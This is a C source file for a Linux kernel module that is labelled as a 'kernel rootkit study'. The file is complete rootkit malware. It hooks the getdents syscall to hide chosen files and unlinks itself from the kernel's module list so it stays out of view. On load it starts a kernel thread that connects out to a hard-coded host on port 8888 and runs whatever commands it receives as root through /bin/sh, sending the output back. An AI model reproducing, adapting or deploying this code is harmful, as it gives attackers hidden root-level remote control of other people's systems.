#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/moduleparam.h>
#include <linux/sched.h> 
#include<linux/init.h>
#include<linux/module.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("windy_ll");
MODULE_DESCRIPTION("kernel rootkit study");
MODULE_VERSION("1.0.0");

static struct task_struct *test_kthread = NULL;
static struct list_head *prev_module;
static int debug_mode = 1;
static int hide_mode = 0;
static char hidedirlist[100][10];

int calchidedirlistlength(void)
{
	int i,result;

	result = 0;
	for (i = 0; i < 100; i++)
	{
		if(hidedirlist[i][0] == '\0')
		{
			break;
		}
		result++;
	}
	return result;
}

void resethidedirlist(void)
{
	int i,k;

	for (i = 0; i < 100; i++)
	{
		for (k = 0; k < 10; k++)
		{
			hidedirlist[i][k] = '\0';
		}
	}
}

void inserthidelist(char name[10])
{
	int index;

	index = calchidedirlistlength();
	strcpy(hidedirlist[index],name);
}

int check(char *ptr)
{
	int i,result,length;

	result = 0;
	length = calchidedirlistlength();
	for(i = 0;i < length;i++)
	{
		if(strstr(ptr,hidedirlist[i]) != NULL)
		{
			result = 1;
			break;
		}
	}
	return result;
}

void hideme(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void showme(void)
{
	list_add(&THIS_MODULE->list,prev_module);
}

static asmlinkage long (*orig_getdents)(const struct pt_regs *);

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
	    unsigned long d_ino;
	    unsigned long d_off;
        unsigned short d_reclen;
	    char d_name[];
    };
	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
	struct linux_dirent *current_dir,*previous_dir,*dirent_ker = NULL;
	unsigned long offset = 0;
	long error;

	int ret = orig_getdents(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	
	if ((ret <= 0) || (dirent_ker == NULL))
	{
		printk(KERN_DEBUG "error 1,ret is %d\n",ret);
		return ret;
	}

	error = copy_from_user(dirent_ker, dirent, ret);
	if(error)
	{
		printk(KERN_DEBUG "error 2\n");
		goto done;
	}

	while(offset < ret)
	{
		current_dir = (void *)dirent_ker + offset;
		if(check(current_dir->d_name) == 1)
		{
			if(debug_mode == 1)
			{
				printk(KERN_DEBUG "rootkit: Found %s\n", current_dir->d_name);
			}
			if(current_dir == dirent_ker)
			{
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else
		{
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if(error)
	{
		printk(KERN_DEBUG "error 3\n");
		goto done;
	}

done:
	kfree(dirent_ker);
	return ret;
}

static char* execcmd(char cmd[1024])
{
    int result;
	struct file *fp;
	mm_segment_t fs;
	loff_t pos;
	static char buf[4096];
	char add[] = " > /tmp/result.txt";
    char cmd_path[] = "/bin/sh";
	strcat(cmd,add);
    char *cmd_argv[] = {cmd_path,"-c",cmd,NULL};
    char *cmd_envp[] = {"HOME=/","PATH=/sbin:/bin:/user/bin",NULL};
    result = call_usermodehelper(cmd_path,cmd_argv,cmd_envp,UMH_WAIT_PROC);
    if(debug_mode == 1) {
        printk(KERN_INFO "[rootkit]: call_usermodehelper() result is %d\n",result);
    }
	fp = filp_open("/tmp/result.txt",O_RDWR | O_CREAT,0644);
	if(IS_ERR(fp)) {
		printk(KERN_INFO "[rootkit]: open file failed!\n");
		return 0;
	}
	memset(buf,0,sizeof(buf));
	fs = get_fs();
	set_fs(KERNEL_DS);
	pos = 0;
	vfs_read(fp,buf,sizeof(buf),&pos);
    if(debug_mode == 1) {
        printk(KERN_INFO "[rootkit]: shell result %ld:\n",strlen(buf));
	    printk("%s\n",buf);
    }
	filp_close(fp,NULL);
	set_fs(fs);
	return buf;
}

static int starttask(void *data){
 
    struct socket *sock,*client_sock;
    struct sockaddr_in s_addr;
    unsigned short portnum=8888;
    int ret=0;
    char recvbuf[1024];
	char sendbuf[4096];
	char hidetmp[10];
	char *result,*ptr;
    struct msghdr recvmsg,sendmsg;
	struct kvec send_vec,recv_vec;

	//sendbuf = kmalloc(1024,GFP_KERNEL);
	if(sendbuf == NULL) {
		printk(KERN_INFO "[rootkit]: sendbuf kmalloc failed!\n");
		return -1;
	}

	//recvbuf = kmalloc(1024,GFP_KERNEL);
	if(recvbuf == NULL) {
		printk(KERN_INFO "[rootkit]: recvbuf kmalloc failed!\n");
		return -1;
	}
 
    memset(&s_addr,0,sizeof(s_addr));
    s_addr.sin_family=AF_INET;
    s_addr.sin_port=htons(portnum);
    s_addr.sin_addr.s_addr=in_aton("10.10.10.195"); 
 
    sock=(struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
    client_sock=(struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
 
    /*create a socket*/
    ret=sock_create_kern(&init_net,AF_INET, SOCK_STREAM,0,&sock);
    if(ret < 0){
        printk("[rootkit]:socket_create_kern error!\n");
		return -1;
    }

	if(debug_mode == 1) {
		printk("[rootkit]:socket_create_kern ok!\n");
	}
    ret=sock->ops->connect(sock,(struct sockaddr *)&s_addr,sizeof(s_addr),0);
	if(debug_mode == 1) {
		printk(KERN_INFO "[rootkit]: connect ret = %d\n",ret);
	}
	/*
        if(ret != 0){
                printk("[SockTest]: connect error\n");
                return ret;
        }
	*/
	if(debug_mode == 1) {
        printk("[rootkit]:connect ok!\n");
	}

	memset(sendbuf,0,1024);

	strcpy(sendbuf,"test");

	memset(&sendmsg,0,sizeof(sendmsg));
	memset(&send_vec,0,sizeof(send_vec));

	send_vec.iov_base = sendbuf;
	send_vec.iov_len = 4096;	
	
        /*send*/
	ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,4);
	printk(KERN_INFO "[rootkit]: kernel_sendmsg ret = %d\n",ret);
	if(ret < 0) {
		printk(KERN_INFO "[rootkit]: kernel_sendmsg failed!\n");
		return ret;
	}
	if(debug_mode == 1) {
		printk(KERN_INFO "[rootkit]: send ok!\n");
	}
	memset(&recv_vec,0,sizeof(recv_vec));
	memset(&recvmsg,0,sizeof(recvmsg));

	recv_vec.iov_base = recvbuf;
	recv_vec.iov_len = 1024;
 
    /*kmalloc a receive buffer*/
	while(true) {
		memset(recvbuf, 0, 1024);

		ret = kernel_recvmsg(sock,&recvmsg,&recv_vec,1,1024,0);
		printk(KERN_INFO "[rootkit]: received message: %s\n",recvbuf);
		if(!strcmp("exit",recvbuf)) {
			break;
		}
		else if(!strcmp("startdebug",recvbuf))
		{
			debug_mode = 1;
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"debug mode start success");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else if((strstr(recvbuf,"hideko") != NULL) && hide_mode == 0)
		{
			hideme();
			hide_mode = 1;
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"hide ko success");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else if((strstr(recvbuf,"hideko") != NULL) && hide_mode == 1)
		{
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"hide ko is already on, please don't repeat");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else if((strstr(recvbuf,"showko") != NULL) && hide_mode == 1)
		{
			showme();
			hide_mode = 0;
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"show ko success");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else if((strstr(recvbuf,"showko") != NULL) && hide_mode == 0)
		{
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"show ko is already on, please don't repeat");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else if((strstr(recvbuf,"hidefile") != NULL))
		{
			ptr = recvbuf;
			ptr = ptr + 9;
			memset(hidetmp,0,10);
			strncpy(hidetmp,ptr,10);
			inserthidelist(hidetmp);
			memset(sendbuf,0,4096);
			strcpy(sendbuf,"add hidefile success");
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
		else
		{
			printk(KERN_INFO "[rootkit]: %ld\n",strlen(recvbuf));
			result = execcmd(recvbuf);
			memset(sendbuf,0,4096);
			strncpy(sendbuf,result,4096);
			ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
		}
	}

	kernel_sock_shutdown(sock,SHUT_RDWR);
	sock_release(sock);
	printk(KERN_INFO "[rootkit]: socket exit\n");
	
	return 0;
}

static struct ftrace_hook hooks[] = {
	HOOK("sys_getdents",hook_getdents,&orig_getdents),
};

static int rootkit_init(void){
	int err;

	resethidedirlist();
	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if(err)
	{
		return err;
	}
	test_kthread = kthread_run(starttask, NULL, "kthread-test");
	if (!test_kthread) {
		return -ECHILD;
	}
 
	return 0;
}
 
static void rootkit_exit(void){
	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
    printk("[rootkit]: rootkit exit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);